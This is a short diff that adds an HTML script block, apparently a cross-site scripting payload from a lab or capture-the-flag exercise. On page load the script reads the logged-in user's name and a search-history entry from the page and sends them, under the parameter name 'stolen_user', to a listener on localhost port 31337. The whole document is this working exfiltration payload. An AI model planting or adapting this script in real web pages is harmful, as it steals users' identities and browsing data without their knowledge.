@@ -1,0 +1,5 @@
+<script>
+	document.addEventListener("DOMContentLoaded",function(event) {
+		$.get("http://localhost:31337/?", {stolen_user: document.getElementById("logged-in-user").innerHTML, last_search: document.getElementById("history-list").children[1].innerHTML })
+	})
+</script>
